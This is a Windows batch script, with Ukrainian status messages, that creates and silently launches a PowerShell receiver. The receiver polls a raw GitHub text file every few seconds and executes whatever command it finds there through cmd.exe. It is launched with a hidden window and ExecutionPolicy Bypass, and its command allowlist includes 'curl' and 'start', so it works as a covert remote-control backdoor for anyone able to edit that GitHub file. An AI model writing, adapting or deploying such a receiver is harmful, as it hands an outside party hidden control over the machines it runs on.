@echo off
chcp 65001 >nul

set "RAW_URL=https://raw.githubusercontent.com/chpokerromajdwuifjw/Smfvrs/refs/heads/main/Execute.txt"
set "PS_FILE=%~dp0receiver_github_txt.ps1"

if exist "%PS_FILE%" (
    echo Файл "%PS_FILE%" вже існує — пропускаю створення.
) else (
    echo Файл не знайдено — створюю "%PS_FILE%".
    > "%PS_FILE%" (
    echo $url = "%RAW_URL%"
    echo $allowedPrefixes = @("echo","start","dir","ping","hostname","notepad","calc","curl")
    echo $lastExec = Get-Date "2025-01-01"
    echo while ($true) {
    echo     try {
    echo         $cmd = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content.Trim()
    echo         if ($cmd -ne "") {
    echo             $now = Get-Date
    echo             $elapsed = ($now - $lastExec).TotalSeconds
    echo             if ($elapsed -ge 60) {
    echo                 $ok = $false
    echo                 foreach ($p in $allowedPrefixes) {
    echo                     if ($cmd.ToLower().StartsWith($p.ToLower() + " ") -or $cmd.ToLower() -eq $p.ToLower()) { $ok = $true; break }
    echo                 }
    echo                 if ($ok) {
    echo                     Write-Host "Виконую команду:" $cmd
    echo                     Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cmd`"" -NoNewWindow -Wait
    echo                     $lastExec = Get-Date
    echo                 } else { Write-Warning "Команда не в білому списку — пропускаю: $cmd" }
    echo             } else { Write-Host ("Пропускаю команду (менше 60 с від останнього виконання): {0:N1} сек пройшло" -f $elapsed) }
    echo         } else { Write-Host "Файл порожній — нічого не виконую" }
    echo     } catch { Write-Warning "Помилка: $_" }
    echo     Start-Sleep -Seconds 5
    echo }
    )
)

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%PS_FILE%"
